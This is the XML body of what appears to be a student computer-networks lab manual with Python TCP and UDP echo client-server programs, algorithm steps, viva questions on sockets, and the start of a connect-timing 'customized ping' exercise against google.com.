    <w:p w14:paraId="2FFB74BC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>clientfd,addr=sockfd.accept()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBA1AD9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receivedMsg=clientfd.recv(1024).decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA4ECC4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print("Connected with ",addr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541C17A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print("Message Received from Client: ",receivedMsg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C47CE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clientfd.send(bytes(receivedMsg,'utf-8'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F92B0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print("Message reply sent to Client!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F35A7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print("Do you want to continue(type y or n):")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE3762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choice=input()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4438A2F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if choice=='n':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD0ADAE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA3BEC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67DADEF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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A786B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clientfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE6DE2F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clientfd.connect(('localhost',55555))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E69F84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name=input("Enter your message:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6882811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clientfd.send(bytes(name,'utf-8'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A0208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print("Message Received from Server: ",clientfd.recv(1024).decode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270CE9EF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3577384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8463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846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72)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B726C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42578D77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33DADAA9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E03435C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UDP Client-Server Communication Using Socket programming in python:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3C0295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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3BBFA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22346C58" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Create a UDP socket using socket.socket(AF_INET,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502D3D6A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SOCK_DGRAM).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7299F65A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Bind the socket to 'localhost' and a specific port using bind().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178CDBA6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Wait to receive a message from a client using recvfrom().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D33A03" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Display the received message and send it back using sendto().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F653C3C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Ask the user whether to continue or close the socket using close().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C4BE03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2BBA4871" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Create a UDP socket using `socket.socket(AF_INET,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2479D83E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SOCK_DGRAM)`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7169770C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Enter the message to send to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7608EDDC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Send the message using `sendto()` with the server’s address and port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F99FD58" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Receive the server’s reply using `recvfrom()` and display it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6198EC83" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Ask the user whether to continue or close the socket using `close()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B64BBC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="66844595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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6E609C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547D27B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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6068CE9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sockfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC9C15C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print("UDP Socket Created")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0BA5BC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sockfd.bind(('localhost', 8000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE209C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print("Waiting for messages...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099E8B3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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224E6D22" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>data, addr = sockfd.recvfrom(1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BD69C6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print("Message Received from Client:", data.decode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8FA22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sockfd.sendto(data, addr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274C881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print("Message reply sent to Client!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0E812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choice = input("Do you want to continue (y/n): ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7C722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if choice.lower() == 'n':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A333D19" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABBAB24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sockfd.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA173B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08E14C6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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463D27A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clientfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3326B41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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED6C2D2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msg = input("Enter message to send: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFCD98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clientfd.sendto(msg.encode(), ('localhost', 8000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62326882" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>data, addr = clientfd.recvfrom(1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E03A36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print("Message from Server:", data.decode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F26148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choice = input("Do you want to continue (y/n): ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EED3B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if choice.lower() == 'n':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3BF3CE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break clientfd.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A05231E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7221045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2294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22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74)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B0AAFD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4F9C91E3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4495938C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394A32C8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus concepts of socket programming in python were studied.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8B0316" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="66025A6D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0353F5F9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is a socket in computer networks?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470FF3ED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A0D93DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A socket is an endpoint for sending and receiving data between two computers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EE115A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191C668A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What are the two main types of sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7196827D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3618E4C1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The two main types are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740C96CD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2023CBF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP Socket (SOCK_STREAM): Connection-oriented and reliable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE1320B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C49B4DA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>UDP Socket (SOCK_DGRAM): Connectionless and faster but less</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72ABD566" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>reliable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4526B1D3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is the difference between TCP and UDP sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7880CA95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7FE8BBA6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP provides reliable, ordered, and error-checked communication, whereas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E73C35F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>UDP provides faster communication without guaranteeing delivery or order of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1AD4EC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52675187" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Which Python module is commonly used for socket programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AF822E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8220C42" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The socket module is used in Python for creating and managing network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3D08E1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098A95D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A2A3AF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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6E36DC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is the role of a server socket and a client socket?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353B57EF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0A946A3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A server socket listens for incoming connection requests, while a client socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3907BAC0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>initiates a connection to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789421ED" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E67A8E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No: 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F8845C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CUSTOMIZED PING COMMAND TO TEST THE SERVER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FA910B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CONNECTIVITY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9B21BF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466A728E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To develop a customized ping command to test the server connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB98713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Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747FEDC4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ping:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD180CC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The ping command sends ICMP echo request packets to a host and waits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0246F10C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for echo replies. It measures reachability and reports RTT statistics (min, max,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769A123A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>avg, packet loss).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBA361C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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BA7DF3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Set host, port, and number of pings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7ED2CF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Create an empty list to store RTT values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326A0885" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Repeat for the given number of pings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D5AE6F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Start a timer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2891A32E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Attempt to connect to host on the given port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762DE0CB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. Stop the timer if connection is successful.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5915B7B7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. Calculate RTT and save it in the list.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3135DDF1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8. If connection fails, print timeout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A90470E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>9. After all attempts, find minimum, maximum, and average RTT.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C02E27E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>10. Display the results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B7BFBB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="55435F7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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B26613" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Customized ping command to test the server connectivity:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B029476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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D06372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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027DB2A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host = "google.com"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3C477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port = 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428EE8B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count = 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F838E32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for i in range(count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F317CF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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE565F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 = socket.socket()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7784D79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start = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4FC486" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>s.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15332E8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end = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678C054B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B406CF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print(f"Reply from {host}: time={(end-start)*1000:.2f} ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7275F0A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except Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319D9B5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print("Request timed out")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065C7E2C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53109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53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75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2561083F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="16861D73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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32247FF9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Customized Ping Program to Measure Min, Max, and Average RTT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4E39F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socket, time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D128FA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host = "google.com"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1DA1C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port = 80</w:t>
      </w:r>
